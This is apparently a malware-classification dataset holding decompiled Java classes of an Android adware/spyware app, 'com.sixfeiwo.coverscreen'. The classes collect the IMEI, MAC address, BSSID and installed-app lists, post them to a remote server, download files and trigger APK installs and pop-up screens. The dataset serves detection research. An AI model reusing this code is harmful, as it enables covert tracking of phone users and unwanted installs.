"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\A.code","final class A implements Runnable {   private C0027z f254a;   public A(  C0027z c0027z){     this.f254a=c0027z;   }   @Override public final void run(){     if (this.f254a.f310a.a() == null || this.f254a.f310a.a().isEmpty()) {       this.f254a.f310a.i();     }  else {       this.f254a.f310a.f();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\aa.code","public interface aa {   void a(  boolean z,  String str); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ab.code","public final class ab implements Runnable {   private URL f279a=null;   private aa b;   private String c;   private String d;   private Context e;   public final void a(  Context context,  String str,  String str2,  String str3){     this.e=context;     this.c=str2;     this.d=str3;     try {       this.f279a=new URL(str);     }  catch (    MalformedURLException e) {       new StringBuilder().append("""").append(e);     }     new StringBuilder().append(""setBaseRequestInfo, url: "").append(str);   }   public final void a(  aa aaVar){     this.b=aaVar;   }   @Override public final void run(){     int b=P.b(this.e);     if (b == 0) {       return;     }     Context context=this.e;     new StringBuilder().append(""\nG_èŽ·å�–æ•°æ�®  > "").append(new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"").format(new Date(System.currentTimeMillis())));     Context context2=this.e;     new StringBuilder().append(""\nG_JSON      "").append(this.d);     if (this.f279a == null) {       Context context3=this.e;       throw new IllegalArgumentException(""URL must be init!_sixfw"".replace(""_sixfw"",""""));     }     if (ao.a(this.c)) {       Context context4=this.e;       throw new IllegalArgumentException(""password must be init!_sixfw"".replace(""_sixfw"",""""));     }     HttpURLConnection httpURLConnection=null;     try {       try {         try {           try {             String defaultHost=Proxy.getDefaultHost();             int defaultPort=Proxy.getDefaultPort();             new StringBuilder().append(""proxyHost: "").append(defaultHost).append("", port: "").append(defaultPort);             HttpURLConnection httpURLConnection2=(2 != b || defaultHost == null || defaultPort <= 0) ? (HttpURLConnection)this.f279a.openConnection() : (HttpURLConnection)this.f279a.openConnection(new java.net.Proxy(Proxy.Type.HTTP,new InetSocketAddress(defaultHost,defaultPort)));             httpURLConnection2.setRequestMethod(""POST_sixfw"".replace(""_sixfw"",""""));             httpURLConnection2.setRequestProperty(""content-type"",""application/x-www-form-urlencoded_sixfw"".replace(""_sixfw"",""""));             httpURLConnection2.addRequestProperty(""appkey_sixfw"".replace(""_sixfw"",""""),this.c);             httpURLConnection2.setDoOutput(true);             httpURLConnection2.setConnectTimeout(60000);             httpURLConnection2.setReadTimeout(30000);             BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(httpURLConnection2.getOutputStream()));             bufferedWriter.write(R.a(this.d,R.a(this.c),false));             bufferedWriter.close();             int responseCode=httpURLConnection2.getResponseCode();             new StringBuilder().append(""get url response code: "").append(responseCode).append("", "").append(this.f279a);             BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(responseCode != 200 ? httpURLConnection2.getErrorStream() : httpURLConnection2.getInputStream()));             StringBuilder sb=new StringBuilder();             while (true) {               String readLine=bufferedReader.readLine();               if (readLine == null) {                 break;               }  else {                 sb.append(readLine);               }             }             bufferedReader.close();             if (responseCode == 200) {               this.b.a(true,R.a(sb.toString(),R.a(this.c)));             }  else {               this.b.a(false,R.a(sb.toString(),R.a(this.c)));             }             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          Exception e) {             this.b.a(false,""Exception: _sixfw"".replace(""_sixfw"","""") + e);             Context context5=this.e;             new StringBuilder().append(""\nG_error Exception > "").append(e).append("" > "");             if (0 != 0) {               httpURLConnection.disconnect();             }           }         }  catch (        SocketTimeoutException e2) {           Context context6=this.e;           new StringBuilder().append(""\nG_error > SocketTimeoutException > "").append(e2).append("" > "");           this.b.a(false,""SocketTimeoutException _sixfw"".replace(""_sixfw"","""") + e2);           if (0 != 0) {             httpURLConnection.disconnect();           }         }       }  catch (      SocketException e3) {         Context context7=this.e;         new StringBuilder().append(""\nG_error SocketException > "").append(e3).append("" > "");         this.b.a(false,""SocketException _sixfw"".replace(""_sixfw"","""") + e3);         if (0 != 0) {           httpURLConnection.disconnect();         }       } catch (      IOException e4) {         Context context8=this.e;         new StringBuilder().append(""\nG_error IOException > "").append(e4).append("" > "");         this.b.a(false,""IOException: _sixfw"".replace(""_sixfw"","""") + e4);         if (0 != 0) {           httpURLConnection.disconnect();         }       }     }  catch (    Throwable th) {       if (0 != 0) {         httpURLConnection.disconnect();       }       throw th;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\AbstractC0002a.code","public abstract class AbstractC0002a {   static boolean f278a=false;   private String c;   private Context d;   private TimerTask g;   private Handler i;   boolean b=false;   private boolean e=false;   private int f=10;   private Timer h=new Timer();   public AbstractC0002a(  Context context,  String str){     this.i=null;     this.d=context;     this.c=str;     f278a=false;     an.b(context,S.j,S.k,str);     an.a(context,S.j,S.m,true);     try {       this.i=new Handler();     }  catch (    Exception e) {     }     try {       ah.a();     }  catch (    Exception e2) {     }     try {       P.c(context);     }  catch (    Exception e3) {     }     if (P.a(context) && P.a(this.d)) {       if (!this.e) {         Context context2=this.d;         a(true);       }       new C0003b(this).start();     }   }   public static void a(  AbstractC0002a abstractC0002a){     JSONObject a2=H.a(abstractC0002a.d,abstractC0002a.c,S.f269a);     ab abVar=new ab();     abVar.a(abstractC0002a.d,I.c(),abstractC0002a.c,a2.toString());     abVar.a(new C0005d(abstractC0002a));     Z.a().a(abVar);   }   public static void b(  AbstractC0002a abstractC0002a){     String a2=an.a(abstractC0002a.d,S.j,""packnames_sixfw"".replace(""_sixfw"",""""),(String)null);     if (a2 != null) {       String[] split=a2.split("","");       JSONArray jSONArray=new JSONArray();       for (      String str : split) {         if (!ao.a(str)) {           JSONObject jSONObject=new JSONObject();           try {             jSONObject.put(""packageName_sixfw"".replace(""_sixfw"",""""),str);           }  catch (          JSONException e) {           }           jSONArray.put(jSONObject);         }       }       if (jSONArray.length() != 0) {         JSONObject a3=H.a(abstractC0002a.d,S.f269a,jSONArray);         ab abVar=new ab();         abVar.a(abstractC0002a.d,I.d(),abstractC0002a.c,a3.toString());         abVar.a(new C0006e(abstractC0002a));         Z.a().a(abVar);       }     }   }   public static boolean isShowAtScreenOn(){     return f278a;   }   public void a(){     this.e=true;     if (this.g != null) {       this.g.cancel();       this.g=null;       this.h.cancel();     }   }   public final void a(  JSONArray jSONArray){     for (int i=0; i < jSONArray.length(); i++) {       String optString=jSONArray.optJSONObject(i).optString(""image_sixfw"".replace(""_sixfw"",""""));       if (!ao.a(optString)) {         this.i.postDelayed(new RunnableC0007f(this,optString),10L);       }       String optString2=jSONArray.optJSONObject(i).optString(""icon_sixfw"".replace(""_sixfw"",""""));       if (!ao.a(optString2)) {         this.i.postDelayed(new RunnableC0008g(this,optString2),10L);       }     }   }   public final void a(  boolean z){     if (z) {       this.f=10;     }  else {       this.f--;     }     if (this.f >= 0 && !this.e) {       if (z) {         if (this.g != null) {           this.g.cancel();           Context context=this.d;         }         b();         return;       }       if (this.g != null) {         Context context2=this.d;         return;       }       this.g=new C0004c(this);       this.h.schedule(this.g,360000L);       Context context3=this.d;     }   }   public final boolean a(  List list,  int i){     try {       Intent intent=new Intent(this.d,(Class<?>)SA.class);       intent.addFlags(335544320);       intent.putExtra(""itemList_sixfw"".replace(""_sixfw"",""""),(ArrayList)list);       intent.putExtra(""index_sixfw"".replace(""_sixfw"",""""),i);       if (this.i != null) {         this.i.post(new RunnableC0009h(this,intent));       }  else {         this.d.startActivity(intent);       }       return true;     }  catch (    Exception e) {       return false;     }   }   public abstract void b();   public void c(){     this.b=false;     this.g=null;   }   public final String d(){     return this.c;   }   public final Context e(){     return this.d;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ac.code","public final class ac {   private static ac b=null;   private static Context c;   private NotificationManager f280a;   private ac(  Context context){     this.f280a=null;     if (this.f280a == null) {       this.f280a=(NotificationManager)context.getSystemService(""notification"");     }   }   private ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a2=a(viewGroup.getChildAt(childCount - 1));       if (a2 != null && a2.getId() == 16908294) {         return a2;       }     }     return null;   }   public static ac a(  Context context){     c=context;     if (b == null) {       b=new ac(c);     }     return b;   }   public final void a(  int i){     this.f280a.cancel(i);   }   public final void a(  int i,  int i2,  String str,  String str2,  String str3,  Intent intent,  int i3,  String str4,  long j){     Notification notification=new Notification();     notification.icon=android.R.drawable.ic_menu_share;     notification.tickerText=str;     notification.flags=i3;     notification.when=j;     notification.setLatestEventInfo(c,str2,str3,PendingIntent.getActivity(c,0,intent,134217728));     if (str4 == null || str4.length() == 0 || notification == null) {       return;     }     try {       ImageView a2=a(View.inflate(c,notification.contentView.getLayoutId(),null));       Y.a();       Bitmap a3=K.a().a(c,Y.a(c,S.d,str4));       if (a3 != null) {         notification.contentView.setImageViewBitmap(a2.getId(),a3);       }       this.f280a.notify(i,notification);     }  catch (    Exception e) {       new StringBuilder().append(""NotificationManagerTool >> "").append(e.getMessage());     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ad.code","public final class ad {   private static final String f281a=""NumberUtil.java_sixfw"".replace(""_sixfw"","""");   public static int a(  String str,  int i){     if (str == null || str.equals("""")) {       return 0;     }     try {       return Integer.parseInt(str.trim());     }  catch (    NumberFormatException e) {       Log.w(f281a,""errorMessage > "" + e);       return 0;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ae.code","public final class ae {   private static ae f282a=null;   private ae(){   }   public static ae a(){     if (f282a == null) {       f282a=new ae();     }     return f282a;   }   public static void a(  Context context,  String str){     if (ao.a(str)) {       return;     }     File file=new File(str);     Intent intent=new Intent();     intent.addFlags(272629760);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive_sixfw"".replace(""_sixfw"",""""));     context.startActivity(intent);   }   public static void b(  Context context,  String str){     if (ao.a(str)) {       return;     }     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent();     try {       intent=packageManager.getLaunchIntentForPackage(str);     }  catch (    ActivityNotFoundException e) {     }     context.startActivity(intent);   }   public static boolean c(  Context context,  String str){     if (ao.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    Exception e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\af.code","public final class af {   private static af f283a;   private af(){     ""PackageInfoManager_sixfw"".replace(""_sixfw"","""");   }   public static af a(){     if (f283a == null) {       f283a=new af();     }     return f283a;   }   public static String a(  Context context,  boolean z){     int i=0;     StringBuffer stringBuffer=new StringBuffer();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 >= installedPackages.size()) {         return stringBuffer.toString().substring(1);       }       PackageInfo packageInfo=installedPackages.get(i2);       if ((packageInfo.applicationInfo.flags & 1) == 0) {         stringBuffer.append("","");         stringBuffer.append(packageInfo.packageName);       }       i=i2 + 1;     }   }   public static boolean a(  Context context,  String str){     if (ao.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ag.code","public final class ag { static {     ""SAVE_IMEI_sixfw"".replace(""_sixfw"","""");   }   public static String a(){     try {       return Build.MANUFACTURER;     }  catch (    Exception e) {       return """";     }   }   public static String a(  Context context){     String str;     try {       str=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     }  catch (    Exception e) {       str=null;     }     return ao.a(str) ? b(context) : str;   }   public static String b(){     try {       return Build.MODEL;     }  catch (    Exception e) {       return """";     }   }   public static String b(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_sixfw"".replace(""_sixfw"",""""))).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return null;     }   }   public static String c(){     try {       return Build.VERSION.SDK;     }  catch (    Exception e) {       return """";     }   }   public static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_sixfw"".replace(""_sixfw"",""""))).getConnectionInfo().getBSSID();     }  catch (    Exception e) {       return null;     }   }   public static am d(  Context context){     am amVar=new am();     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window_sixfw"".replace(""_sixfw"",""""))).getDefaultDisplay().getMetrics(displayMetrics);     amVar.f287a=displayMetrics.widthPixels;     amVar.b=displayMetrics.heightPixels;     return amVar;   }   public static String d(){     try {       return Build.VERSION.RELEASE;     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ah.code","public final class ah {   private static ah f284a=null;   private Handler b=new aj(this);   private ConcurrentHashMap c=new ConcurrentHashMap();   private ExecutorService d=Executors.newSingleThreadExecutor();   private ConcurrentHashMap e=new ConcurrentHashMap();   public static Bitmap a(  Context context,  String str){     Bitmap bitmap;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i=options.outWidth;     int i2=options.outHeight;     am d=ag.d(context);     int i3=1;     while (i / 2 > d.f287a && i2 / 2 > d.b) {       i/=2;       i2/=2;       i3<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i3;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public static ah a(){     if (f284a == null) {       f284a=new ah();     }     return f284a;   }   public static void a(  ah ahVar,  Context context,  String str){     HttpURLConnection httpURLConnection;     FileOutputStream fileOutputStream;     HttpURLConnection httpURLConnection2;     InputStream inputStream;     FileOutputStream fileOutputStream2;     FileOutputStream fileOutputStream3=null;     fileOutputStream3=null;     HttpURLConnection httpURLConnection3=null;     Y.a();     String a2=Y.a(context,S.d,str);     File file=new File(a2 + ""."" + System.currentTimeMillis()+ "".temp_sixfw"".replace(""_sixfw"",""""));     File file2=new File(a2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(5000);         httpURLConnection2.setReadTimeout(5000);         httpURLConnection2.setRequestMethod(""GET_sixfw"".replace(""_sixfw"",""""));         httpURLConnection2.connect();         inputStream=httpURLConnection2.getInputStream();         fileOutputStream2=new FileOutputStream(file);       }  catch (      Exception e) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      Throwable th) {         httpURLConnection=httpURLConnection2;         th=th;       }     }  catch (    Exception e2) {       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       httpURLConnection=null;     }     try {       byte[] bArr=new byte[1024];       while (true) {         int read=inputStream.read(bArr);         if (read == -1) {           break;         }  else {           fileOutputStream2.write(bArr,0,read);         }       }       fileOutputStream2.flush();       fileOutputStream2.close();       file.renameTo(file2);       try {         fileOutputStream2.close();         if (httpURLConnection2 != null) {           httpURLConnection2.disconnect();         }       }  catch (      IOException e3) {       }     }  catch (    Exception e4) {       httpURLConnection3=httpURLConnection2;       fileOutputStream=fileOutputStream2;       if (fileOutputStream != null) {         try {           fileOutputStream.close();         }  catch (        IOException e5) {           return;         }       }       if (httpURLConnection3 != null) {         httpURLConnection3.disconnect();       }     } catch (    Throwable th3) {       fileOutputStream3=fileOutputStream2;       httpURLConnection=httpURLConnection2;       th=th3;       if (fileOutputStream3 != null) {         try {           fileOutputStream3.close();         }  catch (        IOException e6) {           throw th;         }       }       if (httpURLConnection != null) {         httpURLConnection.disconnect();       }       throw th;     }   }   public final Drawable a(  Context context,  String str,  ak akVar){     boolean z;     if (this.c.containsKey(str)) {       Queue queue=(Queue)this.c.get(str);       if (akVar != null) {         queue.add(akVar);       }       z=true;     }  else {       ConcurrentLinkedQueue concurrentLinkedQueue=new ConcurrentLinkedQueue();       this.c.put(str,concurrentLinkedQueue);       if (akVar != null) {         concurrentLinkedQueue.add(akVar);       }       z=false;     }     if (!z) {       this.d.submit(new ai(this,context,str));     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ai.code","public final class ai implements Runnable {   private Context f285a;   private String b;   private ah c;   public ai(  ah ahVar,  Context context,  String str){     this.c=ahVar;     this.f285a=context;     this.b=str;   }   @Override public final void run(){     ConcurrentHashMap concurrentHashMap;     Handler handler;     Handler handler2;     Y.a();     String a2=Y.a(this.f285a,S.d,this.b);     concurrentHashMap=this.c.e;     WeakReference weakReference=(WeakReference)concurrentHashMap.get(this.b);     Bitmap bitmap=weakReference != null ? (Bitmap)weakReference.get() : null;     if (bitmap == null) {       try {         ah ahVar=this.c;         bitmap=ah.a(this.f285a,a2);       }  catch (      Exception e) {       }     }     if (bitmap == null) {       try {         ah.a(this.c,this.f285a,this.b);       }  catch (      Exception e2) {       }     }     if (bitmap == null) {       try {         ah ahVar2=this.c;         bitmap=ah.a(this.f285a,a2);       }  catch (      Exception e3) {       }     }     new StringBuilder().append(""loadDrawable complete, bitmap: "").append(bitmap).append("", url: "").append(this.b);     handler=this.c.b;     handler2=this.c.b;     handler.sendMessage(handler2.obtainMessage(0,new Object[]{this.b,bitmap}));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\aj.code","public final class aj extends Handler {   private ah f286a;   public aj(  ah ahVar){     this.f286a=ahVar;   }   @Override public final void handleMessage(  Message message){     ConcurrentHashMap concurrentHashMap;     ConcurrentHashMap concurrentHashMap2;     if (message.obj == null) {       return;     }     Object[] objArr=(Object[])message.obj;     String str=(String)objArr[0];     Bitmap bitmap=(Bitmap)objArr[1];     BitmapDrawable bitmapDrawable=null;     if (bitmap != null) {       concurrentHashMap2=this.f286a.e;       concurrentHashMap2.put(str,new WeakReference(bitmap));       bitmapDrawable=new BitmapDrawable(bitmap);     }     concurrentHashMap=this.f286a.c;     Queue queue=(Queue)concurrentHashMap.remove(str);     if (queue != null) {       Iterator it=queue.iterator();       while (it.hasNext()) {         ((ak)it.next()).a(bitmapDrawable);       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\ak.code","public interface ak {   void a(  Drawable drawable); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\al.code","public final class al {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Drawable a(  String str){     Drawable drawable=null;     try {       if (S.f.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream(""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"".getBytes(""UTF-8"")),0),null);       }  else       if (S.g.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream("""".getBytes(""UTF-8"")),0),null);       }  else       if (S.h.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream("""".getBytes(""UTF-8"")),0),null);       }     }  catch (    Exception e) {     }     return drawable;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\am.code","public final class am {   int f287a=0;   int b=0; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\an.code","public final class an {   public static int a(  Context context,  String str,  String str2,  int i){     return context.getSharedPreferences(str,0).getInt(str2,i);   }   public static String a(  Context context,  String str,  String str2){     return a(context,str,str2,""0"");   }   public static String a(  Context context,  String str,  String str2,  String str3){     return context.getSharedPreferences(str,0).getString(str2,str3);   }   public static void a(  Context context,  String str,  String str2,  boolean z){     context.getSharedPreferences(str,0).edit().putBoolean(str2,z).commit();   }   public static void b(  Context context,  String str,  String str2){     context.getSharedPreferences(str,0).edit().remove(str2).commit();   }   public static void b(  Context context,  String str,  String str2,  int i){     context.getSharedPreferences(str,0).edit().putInt(str2,i).commit();   }   public static void b(  Context context,  String str,  String str2,  String str3){     context.getSharedPreferences(str,0).edit().putString(str2,str3).commit();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.sixfeiwo.coverscreen\AnimationAnimationListenerC0026y.code","final class AnimationAnimationListenerC0026y implements Animation.AnimationListener {   private Animation.AnimationListener f309a;   private View b;   public AnimationAnimationListenerC0026y(  C0021t c0021t,  Animation.AnimationListener animationListener,  View view){     this.f309a=animationListener;     this.b=view;   }   @Override public final void onAnimationEnd(  Animation animation){     this.f309a.onAnimationEnd(animation);     this.b.setVisibility(0);   }   @Override public final void onAnimationRepeat(  Animation animation){     this.f309a.onAnimationRepeat(animation);   }   @Override public final void onAnimationStart(  Animation animation){     this.f309a.onAnimationStart(animation);   } } "
